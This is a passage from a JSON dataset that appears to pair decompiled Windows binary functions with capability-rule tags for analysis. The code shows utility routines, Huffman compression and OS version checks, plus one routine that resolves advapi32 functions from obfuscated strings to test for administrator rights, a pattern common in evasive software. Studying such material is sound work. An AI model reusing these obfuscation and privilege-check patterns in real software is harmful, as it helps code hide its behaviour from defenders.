2);\n        if (pcVar2 != NULL) {\n            fcn.00412aa3(pcVar2 + param_2, *param_3, param_4);\n            pcVar2[iVar6] = '\\0';\n            if (param_5 == '\\0') {\n                return pcVar2;\n            }\n            fcn.00407f59(param_3);\n            *param_1 = NULL;\n            return pcVar2;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 578
    },
    "00412d73": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00412d73(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar auStack285 [269];\n    \n    if (param_1 == param_2) {\n        return;\n    }\n    uVar4 = 0;\n    fcn.004129e4(param_2, 0, param_3);\n    iVar5 = 0;\ncode_r0x00412db2:\n    do {\n        do {\n            if ((*(param_1 + iVar5) == '\\0') || (param_3 <= uVar4)) {\n                for (uVar4 = 0; uVar4 != param_3; uVar4 = uVar4 + 1) {\n                    if (*(param_2 + uVar4) == '/') {\n                        *(param_2 + uVar4) = 0x5c;\n                    }\n                }\n                *(param_2 + -1 + uVar4) = 0;\n                return;\n            }\n            iVar6 = iVar5 - uVar4;\n            while( true ) {\n                iVar7 = uVar4 + iVar6;\n                cVar1 = *(param_1 + iVar6 + uVar4);\n                iVar5 = iVar7;\n                if ((cVar1 == '\\0') || (cVar1 == '%')) break;\n                if (param_3 <= uVar4) goto code_r0x00412db2;\n                uVar4 = uVar4 + 1;\n                *(param_2 + -1 + uVar4) = cVar1;\n            }\n        } while (cVar1 != '%');\n        iVar3 = iVar7 + 1;\n        fcn.004129e4(auStack285 + 1, 0, 0x100);\n        while( true ) {\n            cVar1 = *(param_1 + iVar3);\n            if ((cVar1 == '%') || (cVar1 == '\\0')) break;\n            if (iVar3 == iVar7 + 0x101) goto code_r0x00412db2;\n            iVar3 = iVar3 + 1;\n            uVar2 = fcn.0041284f(cVar1);\n            auStack285[(iVar3 - iVar7) + -1] = uVar2;\n            iVar5 = iVar3;\n        }\n        if (cVar1 == '\\0') {\n            while( true ) {\n                iVar7 = iVar7 + 1;\n                cVar1 = *(param_1 + iVar7);\n                iVar5 = iVar7;\n                if ((cVar1 == '\\0' || cVar1 == '%') || (param_3 <= uVar4)) break;\n                uVar4 = uVar4 + 1;\n                *(param_2 + -1 + uVar4) = cVar1;\n            }\n        }\n        else if (cVar1 == '%') {\n            iVar7 = sub.msvcrt.dll_getenv(auStack285 + 1);\n            if (iVar7 == 0) {\n                *(param_2 + uVar4) = *(param_1 + iVar7);\n                uVar4 = uVar4 + 1;\n                while( true ) {\n                    cVar1 = *(param_1 + iVar6 + uVar4);\n                    iVar5 = uVar4 + iVar6;\n                    if ((cVar1 == '%' || cVar1 == '\\0') || (param_3 <= uVar4)) break;\n                    uVar4 = uVar4 + 1;\n                    *(param_2 + -1 + uVar4) = cVar1;\n                }\n            }\n            else {\n                iVar7 = iVar7 - uVar4;\n                while ((cVar1 = *(iVar7 + uVar4),  uVar4 < param_3 && (cVar1 != '\\0'))) {\n                    uVar4 = uVar4 + 1;\n                    *(param_2 + -1 + uVar4) = cVar1;\n                }\n                iVar5 = iVar5 + 1;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 931
    },
    "00412f60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00412f60(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    \n    if ((param_2 != 0) && (iVar1 = sub.msvcrt.dll_malloc(param_2 * 3),  iVar1 != 0)) {\n        pcVar3 = iVar1 + 1;\n        for (iVar5 = 0; iVar5 < param_2; iVar5 = iVar5 + 1) {\n            uVar4 = *(param_1 + iVar5);\n            pcVar3[1] = ' ';\n            uVar2 = uVar4 & 0xf;\n            uVar4 = uVar4 >> 4;\n            pcVar3[-1] = (-(uVar4 < 10) & 0xf9U) + 0x37 + uVar4;\n            *pcVar3 = (-(uVar2 < 10) & 0xf9U) + 0x37 + uVar2;\n            pcVar3 = pcVar3 + 3;\n        }\n        if (param_2 < 0) {\n            param_2 = 0;\n        }\n        *(iVar1 + -1 + param_2 * 3) = 0;\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 318
    },
    "004132e6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004132e6(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iStack224;\n    int32_t iStack220;\n    int16_t iStack216;\n    uint uStack212;\n    uint uStack208;\n    int32_t iStack176;\n    int32_t iStack172;\n    uint uStack168;\n    int32_t iStack164;\n    int16_t iStack28;\n    char cStack26;\n    \n    uStack212 = 0;\n    uStack208 = 0;\n    fcn.004129e4(&uStack168, 0, 0x9c);\n    uStack168 = 0x9c;\n    iVar2 = sub.KERNEL32.dll_GetVersionExA(&uStack168);\n    if (iVar2 == 0) {\n        iStack172 = 0x94;\n        iVar6 = sub.KERNEL32.dll_GetVersionExA(&uStack168);\n        if (iVar6 != 0) {\n            return 0;\n        }\n    }\n    uVar3 = fcn.004081aa(\"Ed5LC542dMZ65dlXR8W\");\n    uVar4 = fcn.004081aa(\"wd0RdiNh.Sii\");\n    uVar4 = fcn.00407f7a(uVar4);\n    pcVar5 = fcn.00407f8e(uVar4, uVar3);\n    if (pcVar5 == NULL) {\n        sub.KERNEL32.dll_GetSystemInfo(&uStack212);\n    }\n    else {\n        (*pcVar5)(&uStack212);\n    }\n    if ((iVar2 != 0) && (iStack164 == 2)) {\n        if (iStack176 == 5) {\n            if (iStack172 == 1) {\n                return 0x501;\n            }\n            if (iStack172 == 2) {\n                if (iStack28 == -0x8000) {\n                    return 3;\n                }\n                if ((cStack26 == '\\x01') && (iStack216 == 9)) {\n                    return 2;\n                }\n                iVar2 = sub.USER32.dll_GetSystemMetrics(0x59);\n                return 5 - (iVar2 == 0);\n            }\n        }\n        cVar1 = fcn.0041328f(&iStack224, &iStack220);\n        if ((cVar1 != '\\0') && (iStack224 == 6)) {\n            if (iStack220 == 0) {\n                return ((cStack26 == '\\x01') - 1 & 0xfffffa07) + 0x600;\n            }\n            if (iStack220 == 1) {\n                return (cStack26 != '\\x01') + 8;\n            }\n            if (iStack220 == 2) {\n                return (cStack26 != '\\x01') * 2 + 10;\n            }\n            if (iStack220 == 3) {\n                return (cStack26 != '\\x01') * 3 + 0xb;\n            }\n        }\n        cVar1 = fcn.0041328f(&iStack224, &iStack220);\n        if (((cVar1 != '\\0') && (iStack224 == 10)) && (iStack220 == 0)) {\n            return (cStack26 != '\\x01') * 2 + 0xd;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 779
    },
    "004135f2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.004135f2(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iStack84;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uchar auStack28 [10];\n    uchar uStack18;\n    uchar uStack17;\n    uchar uStack16;\n    uchar uStack15;\n    uchar uStack14;\n    uchar uStack13;\n    \n    uStack18 = 0;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 5;\n    uVar1 = fcn.004081aa(\"DiiWYC5dDRSXR454Ci4kdM4S\");\n    uVar2 = fcn.00407f7a(\"advapi32.dll\");\n    pcVar3 = fcn.00407f8e(uVar2, uVar1);\n    uVar1 = fcn.004081aa(\"PIdYwqWwdRFdlVd06I4s\");\n    uVar2 = fcn.00407f7a(\"advapi32.dll\");\n    pcVar4 = fcn.00407f8e(uVar2, uVar1);\n    uVar1 = fcn.004081aa(\"_0ddM4S\");\n    uVar2 = fcn.00407f7a(\"advapi32.dll\");\n    pcVar5 = fcn.00407f8e(uVar2, uVar1);\n    if ((pcVar3 != NULL && pcVar4 != NULL) && (pcVar5 != NULL)) {\n        puStack36 = auStack28;\n        uStack40 = 0;\n        uStack44 = 0;\n        uStack48 = 0;\n        uStack52 = 0;\n        uStack56 = 0;\n        uStack60 = 0;\n        uStack64 = 0x220;\n        uStack68 = 0x20;\n        uVar1 = 2;\n        iVar6 = (*pcVar3)(&uStack18, 2);\n        if (iVar6 != 0) {\n            (*pcVar4)(0, uVar1, &uStack68);\n            uVar7 = (*pcVar5)(iStack84);\n            return uVar7 & 0xffffff00 | iStack84 != 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 608
    },
    "00413a0f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.00413a0f(uint8_t param_1)\n\n{\n    bool bVar1;\n    \n    bVar1 = false;\n    if (param_1 != 0xff) {\n        bVar1 = *(param_1 * 4 + 0x42b5e0) != 0;\n    }\n    return bVar1;\n}\n",
        "token_count": 79
    },
    "00414976": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00414976(void)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int16_t *piVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    int32_t *piVar15;\n    uint *puVar16;\n    uint32_t uVar17;\n    ulong uVar18;\n    int32_t iStack20;\n    \n    iStack20 = in_EAX;\n    uVar18 = fcn.0041f3f0();\n    iVar4 = -uVar18;\n    *(&stack0xfffffff0 + iVar4) = uVar18 >> 0x20;\n    *(&stack0xfffffff8 + iVar4) = extraout_ECX;\n    *(&iStack20 + iVar4) = iStack20;\n    iVar5 = 0;\n    iVar7 = *(&stack0x000015b0 + iVar4);\n    puVar16 = &stack0x00000014 + iVar4;\n    for (iVar8 = 0x21; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar16 = 0;\n        puVar16 = puVar16 + 1;\n    }\n    if (iVar7 == 0) {\n        iVar7 = *(&stack0xfffffff0 + iVar4);\n        iVar5 = *(&iStack20 + iVar4);\n        iVar13 = 0;\n        for (iVar8 = 0; iVar8 < *(&stack0xfffffff8 + iVar4); iVar8 = iVar8 + 1) {\n            iVar2 = *(iVar5 + 0x8192 + iVar7 * 0x240 + iVar8 * 2);\n            if (iVar2 != 0) {\n                *(&stack0x00000498 + iVar13 * 4 + iVar4) = iVar2;\n                *(&stack0x0000049a + iVar13 * 4 + iVar4) = iVar8;\n                iVar13 = iVar13 + 1;\n            }\n        }\n        iVar5 = 0;\n        puVar16 = &stack0x00000d98 + iVar4;\n        for (iVar7 = 0x200; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar16 = 0;\n            puVar16 = puVar16 + 1;\n        }\n        for (; iVar13 != iVar5; iVar5 = iVar5 + 1) {\n            uVar9 = *(&stack0x00000498 + iVar5 * 4 + iVar4);\n            *(&stack0x00000d98 + (uVar9 & 0xff) * 4 + iVar4) = *(&stack0x00000d98 + (uVar9 & 0xff) * 4 + iVar4) + 1;\n            *(&stack0x00001198 + (uVar9 >> 8 & 0xff) * 4 + iVar4) =\n                 *(&stack0x00001198 + (uVar9 >> 8 & 0xff) * 4 + iVar4) + 1;\n        }\n        iVar7 = 0;\n        *(&stack0xfffffffc + iVar4) = iVar13 != *(&stack0x00001198 + iVar4);\n        *(&stack0xfffffffc + iVar4) = *(&stack0xfffffffc + iVar4) + 1;\n        *(&stack0xfffffff4 + iVar4) = &stack0x00000498 + iVar4;\n        piVar10 = &stack0x00000918 + iVar4;\n        while( true ) {\n            iVar5 = 0;\n            *(&stack0x00000000 + iVar4) = iVar7 * 8;\n            iVar8 = 0;\n            do {\n                *(&stack0x00000098 + iVar5 * 4 + iVar4) = iVar8;\n                iVar8 = iVar8 + *(&stack0x00000d98 + iVar5 * 4 + iVar7 * 0x400 + iVar4);\n                iVar5 = iVar5 + 1;\n            } while (iVar5 != 0x100);\n            for (iVar5 = 0; iVar13 != iVar5; iVar5 = iVar5 + 1) {\n                uVar9 = *(*(&stack0xfffffff4 + iVar4) + iVar5 * 4) >> ((&stack0x00000000)[iVar4] & 0x1f) & 0xff;\n                iVar8 = *(&stack0x00000098 + uVar9 * 4 + iVar4);\n                *(&stack0x00000098 + uVar9 * 4 + iVar4) = iVar8 + 1;\n                *(piVar10 + iVar8 * 2) = *(*(&stack0xfffffff4 + iVar4) + iVar5 * 4);\n            }\n            iVar7 = iVar7 + 1;\n            if (iVar7 == *(&stack0xfffffffc + iVar4)) break;\n            piVar3 = *(&stack0xfffffff4 + iVar4);\n            *(&stack0xfffffff4 + iVar4) = piVar10;\n            piVar10 = piVar3;\n        }\n        if (iVar13 != 0) {\n            if (iVar13 == 1) {\n                *piVar10 = 1;\n            }\n            else {\n                *piVar10 = *piVar10 + piVar10[2];\n                iVar5 = 2;\n                iVar8 = 0;\n                *(&stack0xfffffffc + iVar4) = iVar13 + -1;\n                for (iVar7 = 1; *(&stack0xfffffff4 + iVar4) = *(&stack0xfffffffc + iVar4), \n                    iVar7 < *(&stack0xfffffffc + iVar4); iVar7 = iVar7 + 1) {\n                    if ((iVar5 < iVar13) && (iVar6 = iVar5 * 2,  piVar10[iVar6] <= piVar10[iVar8 * 2])) {\n                        iVar5 = iVar5 + 1;\n                        piVar10[iVar7 * 2] = piVar10[iVar6];\n                    }\n                    else {\n                        iVar6 = iVar8 * 2;\n                        iVar8 = iVar8 + 1;\n                        piVar10[iVar7 * 2] = piVar10[iVar6];\n                        piVar10[iVar6] = iVar7;\n                    }\n                    if ((iVar5 < iVar13) && ((iVar7 <= iVar8 || (piVar10[iVar5 * 2] <= piVar10[iVar8 * 2])))) {\n                        piVar10[iVar7 * 2] = piVar10[iVar7 * 2] + piVar10[iVar5 * 2];\n                        iVar5 = iVar5 + 1;\n                    }\n                    else {\n                        iVar6 = iVar8 * 2;\n                        iVar8 = iVar8 + 1;\n                        piVar10[iVar7 * 2] = piVar10[iVar7 * 2] + piVar10[iVar6];\n                        piVar10[iVar6] = iVar7;\n                    }\n                }\n                piVar10[iVar13 * 2 + -4] = 0;\n                for (iVar7 = iVar13 + -3; iVar7 != -1; iVar7 = iVar7 + -1) {\n                    piVar10[iVar7 * 2] = piVar10[piVar10[iVar7 * 2] * 2] + 1;\n                }\n                iVar7 = iVar13 + -2;\n                *(&stack0xfffffffc + iVar4) = 1;\n                uVar9 = 0;\n                iVar5 = iVar7;\n                while( true ) {\n                    while ((iVar7 != -1 && (piVar10[iVar7 * 2] == uVar9))) {\n                        iVar7 = iVar7 + -1;\n                    }\n                    iVar8 = *(&stack0xfffffff4 + iVar4);\n                    *(&stack0xfffffff4 + iVar4) = *(&stack0xfffffffc + iVar4) - iVar8;\n                    while (iVar5 - iVar7 < *(&stack0xfffffff4 + iVar4) + iVar8) {\n                        iVar8 = iVar8 + -1;\n                        piVar10[iVar8 * 2 + 2] = uVar9;\n                    }\n                    uVar9 = uVar9 + 1;\n                    iVar5 = (iVar5 - iVar7) * 2;\n                    *(&stack0xfffffffc + iVar4) = iVar5;\n                    if (iVar5 == 0) break;\n                    *(&stack0xfffffff4 + iVar4) = iVar8;\n                    iVar5 = iVar7;\n                }\n            }\n            iVar7 = 0;\n            do {\n                iVar5 = iVar7 * 2;\n                iVar7 = iVar7 + 1;\n                *(&stack0x00000014 + piVar10[iVar5] * 4 + iVar4) = *(&stack0x00000014 + piVar10[iVar5] * 4 + iVar4) + 1;\n            } while (iVar13 != iVar7);\n            if (iVar13 != 1) {\n                iVar7 = *(&stack0x000015ac + iVar4);\n                piVar1 = &stack0x00000014 + *(&stack0x000015ac + iVar4) * 4 + iVar4;\n                while (iVar7 = iVar7 + 1,  iVar7 < 0x21) {\n                    *piVar1 = *piVar1 + *(&stack0x00000014 + iVar7 * 4 + iVar4);\n                }\n                iVar7 = *(&stack0x000015ac + iVar4);\n                *(&stack0xfffffff4 + iVar4) = 0;\n                for (; 0 < iVar7; iVar7 = iVar7 + -1) {\n                    *(&stack0xfffffff4 + iVar4) =\n                         *(&stack0xfffffff4 + iVar4) +\n                         (*(&stack0x00000014 + iVar7 * 4 + iVar4) << (*(&stack0x000015ac + iVar4) - iVar7 & 0x1fU));\n                }\n                *(&stack0x00000004 + iVar4) = 1 << ((&stack0x000015ac)[iVar4] & 0x1f);\n                *(&stack0xfffffffc + iVar4) = &stack0x00000010 + *(&stack0x000015ac + iVar4) * 4 + iVar4;\n                while (*(&stack0xfffffff4 + iVar4) != *(&stack0x00000004 + iVar4)) {\n                    iVar7 = *(&stack0x000015ac + iVar4);\n                    *piVar1 = *piVar1 + -1;\n                    piVar15 = *(&stack0xfffffffc + iVar4);\n                    do {\n                        iVar7 = iVar7 + -1;\n                        if (iVar7 < 1) goto code_r0x00414cf4;\n                        *(&stack0x00000000 + iVar4) = piVar15;\n                        iVar5 = *piVar15;\n                        piVar15 = piVar15 + -1;\n                    } while (iVar5 == 0);\n                    **(&stack0x00000000 + iVar4) = iVar5 + -1;\n                    *(&stack0x00000018 + iVar7 * 4 + iVar4) = *(&stack0x00000018 + iVar7 * 4 + iVar4) + 2;\ncode_r0x00414cf4:\n                    *(&stack0xfffffff4 + iVar4) = *(&stack0xfffffff4 + iVar4) + -1;\n                }\n            }\n        }\n        iVar7 = *(&stack0xfffffff0 + iVar4);\n        iVar5 = *(&iStack20 + iVar4);\n        puVar16 = *(&iStack20 + iVar4) + 0x8f12 + iVar7 * 0x120;\n        for (iVar8 = 0x48; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar16 = 0;\n            puVar16 = puVar16 + 1;\n        }\n        puVar16 = *(&iStack20 + iVar4) + 0x8852 + *(&stack0xfffffff0 + iVar4) * 0x240;\n        for (iVar8 = 0x90; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar16 = 0;\n            puVar16 = puVar16 + 1;\n        }\n        for (iVar8 = 1; iVar8 <= *(&stack0x000015ac + iVar4); iVar8 = iVar8 + 1) {\n            iVar6 = *(&stack0x00000014 + iVar8 * 4 + iVar4);\n            *(&stack0xfffffff4 + iVar4) = piVar10 + (iVar6 * 0x3fffffff + iVar13) * 2;\n            for (iVar11 = iVar6; 0 < iVar11; iVar11 = iVar11 + -1) {\n                *(*(*(&stack0xfffffff4 + iVar4) + -2 + iVar11 * 4) + 0x8f12 + iVar7 * 0x120 + iVar5) = iVar8;\n            }\n            if (iVar6 < 0) {\n                iVar6 = 0;\n            }\n            iVar13 = iVar13 - iVar6;\n        }\n    }\n    else {\n        iVar7 = *(&stack0xfffffff0 + iVar4);\n        iVar8 = *(&iStack20 + iVar4);\n        for (; iVar5 < *(&stack0xfffffff8 + iVar4); iVar5 = iVar5 + 1) {\n            *(&stack0x00000014 + *(iVar7 * 0x120 + iVar8 + 0x8f12 + iVar5) * 4 + iVar4) =\n                 *(&stack0x00000014 + *(iVar7 * 0x120 + iVar8 + 0x8f12 + iVar5) * 4 + iVar4) + 1;\n        }\n    }\n    *(&stack0x00000d9c + iVar4) = 0;\n    iVar7 = 0;\n    for (iVar5 = 2; iVar5 <= *(&stack0x000015ac + iVar4); iVar5 = iVar5 + 1) {\n        iVar7 = (iVar7 + *(&stack0x00000010 + iVar5 * 4 + iVar4)) * 2;\n        *(&stack0x00000d98 + iVar5 * 4 + iVar4) = iVar7;\n    }\n    iVar7 = *(&stack0xfffffff0 + iVar4);\n    iVar5 = *(&iStack20 + iVar4) + iVar7 * 0x120;\n    for (iVar8 = 0; iVar8 < *(&stack0xfffffff8 + iVar4); iVar8 = iVar8 + 1) {\n        uVar9 = *(iVar5 + 0x8f12 + iVar8);\n        if (uVar9 != 0) {\n            uVar17 = *(&stack0x00000d98 + uVar9 * 4 + iVar4);\n            *(&stack0x00000d98 + uVar9 * 4 + iVar4) = uVar17 + 1;\n            uVar12 = 0;\n            for (; uVar9 != 0; uVar9 = uVar9 - 1) {\n                uVar14 = uVar17 & 1;\n                uVar17 = uVar17 >> 1;\n                uVar12 = uVar12 * 2 | uVar14;\n            }\n            *(iVar7 * 0x120 + iVar5 + 0x8852 + iVar8 * 2) = uVar12;\n        }\n    }\n    return;\n}\n",
        "token_count": 3560
    },
    "00414dc1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00414dc1(void)\n\n{\n    code *pcVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar7;\n    uchar *puVar8;\n    bool bVar9;\n    ulong uVar10;\n    int32_t iStack20;\n    uint *puVar6;\n    \n    iStack20 = in_EAX;\n    uVar10 = fcn.0041f3f0();\n    uVar4 = uVar10 >> 0x20;\n    iVar7 = -uVar10;\n    puVar5 = &stack0xffffffec + iVar7;\n    uVar3 = *(&stack0x0000102c + iVar7);\n    if (0x1000 < uVar3) {\n        uVar3 = 0x1000;\n    }\n    puVar8 = &stack0x0000000c + iVar7;\n    for (; iVar7 = extraout_ECX,  uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    while( true ) {\n        if (puVar5[0x410] == 0) {\n            return 1;\n        }\n        uVar3 = puVar5[0x410];\n        if (0x1000 < uVar3) {\n            uVar3 = 0x1000;\n        }\n        puVar5[4] = uVar3;\n        puVar5[1] = uVar4;\n        puVar5[2] = iVar7;\n        puVar5[3] = puVar5 + 8;\n        *puVar5 = *(iStack20 + 0x44);\n        pcVar1 = *(iStack20 + 0x3c);\n        puVar6 = puVar5 + -1;\n        puVar5 = puVar5 + -1;\n        *puVar6 = 0x414e32;\n        uVar2 = (*pcVar1)();\n        if (uVar3 != uVar2) break;\n        bVar9 = CARRY4(uVar4, uVar3);\n        uVar4 = uVar4 + uVar3;\n        iVar7 = iVar7 + bVar9;\n        *(puVar5 + 0x1040) = *(puVar5 + 0x1040) - uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 599
    },
    "00414e59": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.00414e59(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    bool bVar6;\n    \n    if (*(in_EAX + 0x78) != NULL) {\n        **(in_EAX + 0x78) = *(in_EAX + 0x84) - *(in_EAX + 0x70);\n    }\n    if (*(in_EAX + 0x7c) != NULL) {\n        uVar1 = **(in_EAX + 0x7c) - *(in_EAX + 0x8c);\n        if (*(in_EAX + 0x5c) < uVar1) {\n            uVar1 = *(in_EAX + 0x5c);\n        }\n        puVar4 = in_EAX + 0x39272 + *(in_EAX + 0x58);\n        puVar5 = *(in_EAX + 0x8c) + *(in_EAX + 0x74);\n        for (uVar3 = uVar1; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        *(in_EAX + 0x58) = *(in_EAX + 0x58) + uVar1;\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) - uVar1;\n        iVar2 = uVar1 + *(in_EAX + 0x8c);\n        *(in_EAX + 0x8c) = iVar2;\n        **(in_EAX + 0x7c) = iVar2;\n    }\n    bVar6 = false;\n    if (*(in_EAX + 0x60) != 0) {\n        bVar6 = *(in_EAX + 0x5c) == 0;\n    }\n    return bVar6;\n}\n",
        "token_count": 481
    },
    "00414ec9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00414ec9(uint32_t *param_1, uint32_t param_2, uint32_t param_3, uchar *param_4, uint32_t param_5)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    \n    uVar2 = param_1[1];\n    uVar1 = *param_1;\n    if ((uVar2 < param_3) || ((uVar2 <= param_3 && (uVar1 <= param_2)))) {\n        param_5 = 0;\n    }\n    else if ((uVar2 - param_3 == uVar1 < param_2) && (uVar1 - param_2 < param_5)) {\n        param_5 = uVar1 - param_2;\n    }\n    uVar2 = param_5;\n    puVar3 = param_2 + *(param_1[0x12] + 0x48);\n    for (; param_5 != 0; param_5 = param_5 - 1) {\n        *param_4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        param_4 = param_4 + 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 282
    },
    "00414f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00414f30(int32_t param_1, uint32_t param_2, int32_t param_3, uchar *param_4, uint32_t param_5)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    \n    param_3 = param_3 + CARRY4(param_5, param_2);\n    iVar1 = *(param_1 + 0x48);\n    if ((param_3 != 0) || (iVar2 = 0,  uVar3 = *(iVar1 + 0x4c),  *(iVar1 + 0x4c) < param_5 + param_2)) {\n        iVar2 = param_3;\n        uVar3 = param_5 + param_2;\n    }\n    if (((param_5 == 0) || (iVar2 != 0)) || (0x7fffffff < uVar3)) {\ncode_r0x00414f8a:\n        param_5 = 0;\n    }\n    else {\n        uVar4 = *(iVar1 + 0x50);\n        if (uVar4 < uVar3) {\n            if (uVar4 < 0x40) {\n                uVar4 = 0x40;\n            }\n            for (; uVar4 < uVar3; uVar4 = uVar4 * 2) {\n            }\n            iVar2 = (**(param_1 + 0x30))(*(param_1 + 0x34), *(iVar1 + 0x48), 1, uVar4);\n            if (iVar2 == 0) goto code_r0x00414f8a;\n            *(iVar1 + 0x48) = iVar2;\n            *(iVar1 + 0x50) = uVar4;\n        }\n        puVar5 = param_2 + *(iVar1 + 0x48);\n        for (uVar4 = param_5; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar5 = *param_4;\n            param_4 = param_4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        *(iVar1 + 0x4c) = uVar3;\n    }\n    return param_5;\n}\n",
        "token_count": 526
    },
    "00414fef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
